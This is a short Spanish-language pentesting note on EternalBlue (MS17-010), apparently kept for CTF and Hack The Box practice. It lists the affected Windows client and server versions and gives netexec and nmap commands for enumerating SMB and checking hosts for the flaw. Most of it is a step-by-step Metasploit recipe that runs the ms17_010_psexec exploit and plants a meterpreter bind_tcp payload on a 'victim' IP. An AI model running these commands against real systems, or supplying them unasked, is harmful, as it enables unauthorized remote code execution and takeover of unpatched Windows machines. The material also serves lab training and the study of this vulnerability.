# EternalBlue

Tags: #SMB #EternalBlue 

**Sistemas cliente:**

- Windows XP (todas las ediciones, incluyendo SP3)
- Windows Vista
- Windows 7 (todas las SP, x86/x64) — el más explotado en la práctica
- Windows 8
- Windows 8.1
- Windows 10 (versiones anteriores al parche de marzo 2017 — builds hasta 1511/1607 sin parchear)

**Sistemas servidor:**

- Windows Server 2003 (R2 incluido)
- Windows Server 2008
- Windows Server 2008 R2 — extremadamente común en CTFs/HTB por ser el más "fácil" de explotar de forma estable
- Windows Server 2012
- Windows Server 2012 R2
- Windows Server 2016 (solo builds tempranas sin el parche de marzo 2017)


```bash 
❯ nxc smb IP     # Enumerar el servicio SMB 

# Resultados:
	- Signing:True    = El firmado SMB es obligatorio. Olvidate del SMB relay contra este host.
	- SMBv1:True      = La máquina tiene habilitado SMBv1, un protocolo que debería estar muerto desde el 2017. Es la superficie de EternalBlue (MS17-010). 
	- Null Auth:True  = Acepta sesión nula (login anónimo)
```

```bash 
❯ nxc smb IP -u '' -p '' -M ms17-010    # Verificar si es vulnerable a EternalBlue
❯ nmap --script smb-vuln-ms17-010 -p 445 <IP>
```

## Explotar Metasploit 

```bash 
# Este si funciona para sistemas de x86 y x64
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/smb/ms17_010_psexec          # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/bind_tcp
	❯ set LHOST ❮IP❯                                   # Colocamos la IP de nuestra maquina 
	❯ set RHOSTS ❮IP❯                                  # Colocamos la IP de la maquina victima
	❯ exploit 
```

